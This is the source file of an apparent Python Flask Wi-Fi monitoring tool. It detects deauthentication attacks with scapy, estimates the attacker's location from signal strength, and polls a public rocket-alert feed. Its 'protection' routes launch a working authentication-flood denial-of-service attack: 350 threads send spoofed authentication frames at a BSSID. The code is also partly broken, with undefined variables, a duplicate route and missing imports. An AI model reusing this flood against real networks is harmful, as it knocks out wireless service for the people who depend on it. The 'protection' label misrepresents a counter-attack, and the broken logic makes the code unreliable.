import subprocess
import sys

required_modules = [
    "subprocess", "threading", "time", "logging", "datetime", "scapy", 
    "flask", "playsound", "random", "string", "socket", "fcntl", 
    "struct", "requests", "json", "numpy"
]

def install_module(module_name):
    """Install the module via pip if it's not already installed."""
    try:
        print(f"[*] Checking if {module_name} is installed...")
        __import__(module_name)
        print(f"[+] {module_name} is already installed.")
    except ImportError:
        print(f"[!] {module_name} not found. Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
        print(f"[+] {module_name} installed successfully.")

def check_and_install_modules():
    """Check if all required modules are installed, install them if missing."""
    for module in required_modules:
        install_module(module)

check_and_install_modules()

import subprocess
import threading
import time
import logging
from datetime import datetime, timedelta
from scapy.all import *
from flask import Flask, render_template_string, request, jsonify, current_app
from scapy.all import Dot11Deauth, sniff, RadioTap, Dot11, Dot11Auth, sendp, Dot11Beacon
from playsound import playsound
import random
import string
import socket
import fcntl
import struct
import requests
import json
import numpy as np

logging.basicConfig(filename='wifi_monitor.log', level=logging.DEBUG, format='%(asctime)s %(levelname)s: %(message)s')
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

ALERT_COOLDOWN = 15
last_alert_time = 0

attacks = {
    "deauth": [],
    "auth": [],
    "probe": [],
    "disassoc": []
}
played_alerts = set()
sniff_thread = None
bssid_under_attack = None
app = Flask(__name__)


url = "https://www.oref.org.il/warningMessages/alert/History/AlertsHistory.json"
file_path = "alerts_history.json"
delay_seconds = 5 


with open('website.html', 'r') as file:
    MAP_HTML = file.read()

@app.route('/clear_logs', methods=['POST'])
def clear_logs():
    """Clear the log file."""
    try:
        with open('wifi_monitor.log', 'w') as log_file:
            log_file.write('')
        return jsonify(status="success")
    except Exception as e:
        logger.error(f"Error clearing logs: {e}")
        return jsonify(status="error")


def average_rssi(rssi_values):
    return np.mean(rssi_values)

def signal_strength_decay(rssi, band='2.4GHz'):
    decay_factor = 2 if band == '5GHz' else 3
    return 10 ** ((-rssi - 30) / (10 * decay_factor))

def determine_attacker_proximity(rssi_values, band='2.4GHz'):
    avg_rssi = average_rssi(rssi_values)
    distance = signal_strength_decay(avg_rssi, band)
    if avg_rssi > -30:
        proximity = "Attacker is very close, within a few meters"
    elif -30 >= avg_rssi > -50:
        proximity = "Attacker is nearby, possibly within the same room"
    elif -50 >= avg_rssi > -70:
        proximity = "Attacker is in close proximity, likely within the same building"
    else:
        proximity = "Attacker is in the vicinity, but farther away"
    return proximity, distance

def determine_attacker_location(rssi_values, band='2.4GHz'):
    avg_rssi = average_rssi(rssi_values)
    distance = signal_strength_decay(avg_rssi, band)
    if avg_rssi > -30:
        location = "Attacker is located within Room A"
    elif -30 >= avg_rssi > -50:
        location = "Attacker is currently in Room B"
    elif -50 >= avg_rssi > -70:
        location = "Attacker's location is in the hallway outside Room C"
    else:
        location = "Attacker is potentially in an adjacent building"
    return location, distance
    
def extract_essid_from_bssid(bssid, iface="wlan0", timeout=10):
    essid_dict = {}
    def packet_handler(packet):
        if packet.haslayer(Dot11Beacon):
            beacon = packet[Dot11Beacon]
            bssid_packet = packet[Dot11].addr3
            rssi = -(256 - ord(packet.notdecoded[-4:-3]))
            source = packet.addr2
            try:
                essid = beacon.info.decode()
                if essid:  # Check if ESSID is not empty
                    if bssid_packet not in essid_dict:
                        essid_dict[bssid_packet] = {"essid": essid, "rssi": [], "source": source}
                    essid_dict[bssid_packet]["rssi"].append(rssi)
                else:
                    logger.warning(f"Empty ESSID for BSSID {bssid_packet}")
            except UnicodeDecodeError:
                logger.error(f"Unable to decode ESSID for BSSID {bssid_packet}")
                essid = "[Unreadable ESSID]"
                if bssid_packet not in essid_dict:
                    essid_dict[bssid_packet] = {"essid": essid, "rssi": [], "source": source}
                essid_dict[bssid_packet]["rssi"].append(rssi)
    
    sniff(iface=iface, prn=packet_handler, timeout=timeout, store=0)
    if bssid in essid_dict:
        return {"essid": essid_dict[bssid]["essid"], "rssi": average_rssi(essid_dict[bssid]["rssi"]), "source": essid_dict[bssid]["source"]}
    else:
        logger.error(f"BSSID {bssid} not found in the sniffed data")
        return None


@app.route('/current_alert', methods=['GET'])
def current_alert():
    try:
        for attack_type in ["deauth", "auth", "probe", "disassoc"]:
            if attacks.get(attack_type) and len(attacks[attack_type]) > 0:
                latest_attack = attacks[attack_type][-1]
                essid_rssi_data = extract_essid_from_bssid(latest_attack[2])
                if essid_rssi_data and essid_rssi_data.get("essid"):
                    essid = essid_rssi_data["essid"]
                    rssi = essid_rssi_data["rssi"]
                    source = essid_rssi_data["source"]
                    band = '5GHz' if '5GHz' in essid else '2.4GHz'
                    proximity, distance = determine_attacker_proximity([rssi], band)
                    location, _ = determine_attacker_location([rssi], band)
                    message = f"{latest_attack[1]} from {source} detected:\n BSSID: {latest_attack[2]}\n ESSID: {essid}\n RSSI: {rssi} dBm\n {proximity}\n Distance: {distance:.2f} meters\n Location: {location}"
                    return jsonify(alert={"message": message, "type": "red"})
                else:
                    logger.error(f"Invalid ESSID data for BSSID {latest_attack[2]}")
                    return jsonify(alert={"message": "Invalid ESSID data", "type": "red"})
        return jsonify(alert=None)
    except Exception as e:
        logger.error(f"Error retrieving current alert: {e}")
        return jsonify(alert={"message": "An error occurred while retrieving the alert", "type": "red"})


a_p = False
@app.route('/auto_protect', methods=['POST'])
def auto_protect():
    """Enable or disable auto protection for the last attacked Wi-Fi network."""
    global a_p 

    try:
        if not a_p:
            a_p = True
            return jsonify({'status': 'auto_protected', 'message': 'Protection started!'}), 200
        else:
            a_p = False
            return jsonify({'status': 'Protection stopped!', 'message': 'Protection stopped!'}), 200

    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 400

@app.route('/protect_wifi', methods=['POST'])
def protect_wifi():
    """Protect the last attacked Wi-Fi network."""
    global bssid_under_attack

    try:
        if bssid_under_attack:
            iface = 'wlan0'
            
            if iface:
                with app.app_context():
                    threading.Thread(target=start_auth_dos, args=(bssid_under_attack, iface)).start()
                    return jsonify({'status': 'success', 'message': f'protected'}), 200
            else:
                logger.error("Interface not provided")
                return jsonify({'status': 'error', 'message': 'Interface not provided'}), 400
 
        logger.warning("No attack detected. Protection not started.")
        return jsonify({'status': 'error', 'message': 'No attack detected'}), 400

    except Exception as e:
        logger.exception("Error while starting protection.")
        return jsonify({'status': 'error', 'message': str(e)}), 400


def detect_attack_patterns(packet):
    """Detect attack patterns and start auto protection."""
    global attacks, last_alert_time

    if packet.haslayer(Dot11Deauth):
        bssid = packet[Dot11].addr2 
        current_time = time.time()
        if bssid not in [attack[2] for attack in attacks["deauth"]]:
            attacks["deauth"].append((datetime.now(), "Deauth attack", bssid))
            logger.info(f"Deauthentication attack detected: {bssid} with ESSID: {essid_rssi_data['essid']}")
            if a_p:
                threading.Thread(target=protect_wifi).start()
            if current_time - last_alert_time < ALERT_COOLDOWN:
                return
            threading.Thread(target=playsound, args=('detect.m4a',)).start()
            last_alert_time = current_time
        
@app.route('/')
def index():
    return render_template_string(MAP_HTML)

@app.route('/logs')
def logs():
    """Retrieve logs."""
    try:
        with open('wifi_monitor.log', 'r') as log_file:
            log_lines = log_file.readlines()
        return jsonify({'logs': log_lines})
    except Exception as e:
        logger.error(f"Error reading logs: {e}")
        return jsonify({'error': 'Failed to read logs'}), 500
    
@app.route('/start_sniffing', methods=['POST'])
def start_sniffing():
    """Start sniffing."""
    try:
        iface = request.form.get('iface')
        if iface:
            start_sniffing_thread(iface)
            return jsonify(status="Sniffing started")
        else:
            logger.error("No interface provided for sniffing.")
            return jsonify(status="Error", message="No network interface provided. Please select a valid interface."), 400
    except Exception as e:
        logger.error(f"Error starting sniffing: {e}")
        return jsonify(status="Error", message="Failed to start sniffing. Please check the interface and try again."), 500


@app.route('/stop_sniffing', methods=['POST'])
def stop_sniffing():
    """Stop sniffing."""
    global sniff_thread
    try:
        if sniff_thread:
            sniff_thread.join(timeout=1)
            return jsonify(status="Sniffing stopped")
        return jsonify(status="No sniffing process found"), 400
    except Exception as e:
        logger.error(f"Error stopping sniffing: {e}")
        return jsonify(status="Error stopping sniffing"), 500

def run_command(command):
    """Run a shell command and return the output."""
    result = subprocess.run(command, capture_output=True, text=True)
    return result.stdout

def check_and_fix_interface(iface_name):
    """Check and fix the network interface if needed."""
    try:
        iface_status = run_command(['ip', 'link', 'show', iface_name])
        
        if not iface_status:
            logger.error(f"No such interface: {iface_name}")
            return jsonify(status="Error", message=f"Interface '{iface_name}' does not exist. Please check the interface name."), 400
        
        if 'state UP' not in iface_status:
            logger.error(f"Interface {iface_name} is down. Attempting to bring it up.")
            run_command(['sudo', 'ip', 'link', 'set', iface_name, 'up'])
        
        if 'Mode:monitor' not in iface_status:
            logger.error(f"Interface {iface_name} is not in monitor mode. Setting monitor mode.")
            run_command(['sudo', 'iw', 'dev', iface_name, 'set', 'type', 'monitor'])
        
        logger.info(f"Interface {iface_name} is ready and in monitor mode.")
        return jsonify(status="Success", message=f"Interface '{iface_name}' is ready for sniffing.")
    
    except Exception as e:
        logger.error(f"Error checking or fixing interface {iface_name}: {e}")
        return jsonify(status="Error", message=f"Failed to check or fix interface '{iface_name}'. {str(e)}"), 500

def start_sniffing_thread(iface_name):
    """Start packet sniffing in a separate thread."""
    global sniff_thread

    def sniff_loop(app_context):
        with app_context:  # Use the passed app context
            while True:
                try:
                    if check_and_fix_interface(iface_name):
                        sniff_thread = threading.Thread(target=sniff, kwargs={'iface': iface_name, 'prn': detect_attack_patterns, 'store': 0})
                        sniff_thread.daemon = True
                        sniff_thread.start()
                        sniff_thread.join()
                    else:
                        logger.error(f"Failed to fix interface {iface_name}. Retrying in 1 second.")
                except Exception as e:
                    logger.error(f"Error during sniffing: {e}")
                time.sleep(1)

    app_context = app.app_context()  # Create application context
    sniff_thread = threading.Thread(target=sniff_loop, args=(app_context,))
    sniff_thread.daemon = True
    sniff_thread.start()
    logger.info(f"Sniffing started on interface {iface_name}")

# Lock to ensure that multiple threads don't perform the attack simultaneously
attack_time_lock = threading.Lock()

# Store the last attack time for each BSSID
last_attack_time = {}

def start_auth_dos(bssid, iface_name):
    """Perform Authentication DoS attack by sending fake authentication frames."""
    
    def get_random_mac():
        """Generate a random MAC address."""
        return ':'.join([''.join(random.choices('0123456789ABCDEF', k=2)) for _ in range(6)]).upper()

    def send_auth_frame():
        """Send a fake authentication frame."""
        try:
            # Ensure that BSSID and iface_name are valid
            if not bssid or not iface_name:
                logging.error(f"Invalid BSSID or interface: bssid={bssid}, iface_name={iface_name}")
                return

            # Generate a random fake MAC address
            fake_mac = get_random_mac()
            logging.debug(f"Generated fake MAC: {fake_mac}")

            # Create the fake authentication frame
            auth_frame = RadioTap() / Dot11(addr1=bssid, addr2=fake_mac, addr3=bssid) / Dot11Auth(seqnum=1, status=0)

            # Send the frame
            sendp(auth_frame, iface=iface_name, verbose=False)
            logging.debug(f"Sent Auth frame to BSSID: {bssid} with fake MAC: {fake_mac}")
        
        except Exception as e:
            logging.error(f"Error sending frame: {e}, BSSID: {bssid}, Interface: {iface_name}")

    current_time = time.time()
    
    # Ensure that the attack is not repeated within 20 seconds
    with attack_time_lock:
        if bssid in last_attack_time and (current_time - last_attack_time[bssid]) < 20:
            logging.info(f"Skipping Auth DoS on BSSID {bssid}. Attack already performed recently.")
            return

        last_attack_time[bssid] = current_time

    num_threads = 350  # Number of threads for the attack
    logging.info(f"Starting Auth DoS on BSSID {bssid} with {num_threads} threads...")

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_auth_frame, daemon=True)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    logging.info(f"Auth DoS on BSSID {bssid} completed.")


def fetch_data(url):
    """Fetch data from the specified URL and return the JSON response."""
    try:
        logger.debug(f"Fetching data from {url}")
        response = requests.get(url)
        response.raise_for_status()
        data = response.json()
        logger.debug(f"Data fetched: {data}")  # Log the fetched data
        return data
    except requests.exceptions.RequestException as e:
        logger.error(f"Error fetching data: {e}")
        return None        
    
def load_existing_data(file_path):
    """Load existing data from the specified file."""
    if os.path.exists(file_path):
        with open(file_path, "r", encoding="utf-8") as file:
            return file.read()
    return None

def save_data(file_path, data):
    """Save data to the specified file."""
    with open(file_path, "w", encoding="utf-8") as file:
        file.write(data)
        
def update_alert_data(file_path, new_data):
    """Update the alert data file with new data if it has changed."""
    logger.debug("Updating alert data...")
    existing_data = load_existing_data(file_path)
    new_data_str = json.dumps(new_data, indent=4, ensure_ascii=False)
    
    if existing_data is None or new_data_str != existing_data:
        logger.debug("Data has changed. Saving new data.")
        save_data(file_path, new_data_str)
        return True
    else:
        logger.debug("No new data. No update needed.")
    return False

@app.route('/alerts', methods=['GET'])
def get_alerts():
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8') as file:
            alerts = json.load(file)
        logger.debug("Returning alerts data")
        return jsonify(alerts)
    logger.debug("No alerts data found")
    return jsonify([])

@app.route('/')
def serve_map():
    return render_template_string('', 'indexx.html')


def get_private_ip():
    """Get a valid private IP address."""
    import socket
    import ipaddress
    try:
    
        hostname = socket.gethostname()
        ip_addresses = socket.gethostbyname_ex(hostname)[2]

        for ip in ip_addresses:
            ip_obj = ipaddress.ip_address(ip)
            if ip_obj.is_private and not ip_obj.is_loopback:
                return str(ip_obj)

        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
 
            s.connect(('8.8.8.8', 1))
            return s.getsockname()[0]

    except Exception as e:
        print(f"Error retrieving IP address: {e}")
        return None 
    
def main():
    """Main function to run the Flask app."""
    ip_address = get_private_ip()
    
    if ip_address is None:
        print("Error: IP address could not be retrieved")
    else:
        print(f"YuB-X: Ready!\nWebsite: {ip_address}:5000\n")
	    
    global sniff_thread
    sniff_thread = threading.Thread(target=start_sniffing_thread, args=('wlan0',))
    sniff_thread.start()
    def data_fetcher():
        while True:
            new_data = fetch_data(url)
            if new_data is not None:
                if update_alert_data(file_path, new_data):
                    logger.info("[+] Detected new alerts")
                    threading.Thread(target=playsound, args=('alert_r.m4a',)).start()
            time.sleep(delay_seconds)
    
    fetch_thread = Thread(target=data_fetcher, daemon=True)
    fetch_thread.start()
    threading.Thread(target=playsound, args=('welcome.m4a',)).start()
    app.run(debug=False, host='0.0.0.0', port=5000)

if __name__ == "__main__":
    main()
